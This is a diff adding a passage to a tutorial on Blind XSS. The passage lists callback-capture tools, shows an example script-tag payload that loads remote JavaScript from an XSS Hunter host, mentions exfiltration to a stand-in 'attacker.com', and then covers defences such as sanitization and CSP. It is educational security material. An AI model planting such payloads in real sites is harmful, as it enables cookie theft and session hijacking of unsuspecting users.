@@ -83,4 +83,33 @@ Blind XSS often requires evasion and persistence:
 ---
 
 ### **(4) Using Blind XSS Tools**  
-Automate detection with
+Automate detection with:  
+- **XSS Hunter** – Hosted service that captures callbacks (screenshots, cookies, DOM).  
+- **Burp Collaborator** – Built into Burp Suite for out-of-band testing.  
+
+Example payload for XSS Hunter:  
+```html
+<script src="https://xsshunter.com/yourpayload.js"></script>
+```
+
+---
+
+## **Defending Against Blind XSS**  
+
+### **(1) Input Sanitization**  
+- Use libraries like `DOMPurify` to sanitize HTML/JS in user inputs.  
+- Encode outputs with context-aware escaping (HTML, JavaScript, URL).  
+
+### **(2) Content Security Policy (CSP)**  
+Restrict script execution:  
+```http
+Content-Security-Policy: default-src 'self'; script-src 'none'; connect-src 'none';
+```
+Prevents data exfiltration via `fetch()` or `<img src="attacker.com">`.  
+
+### **(3) Monitoring and Logging**  
+- Audit admin panels/logs for suspicious scripts.  
+- Implement WAF rules to block known XSS payloads.  
+
+### **(4) Least Privilege for Admin Views**  
+- Render user-submitted content as plain
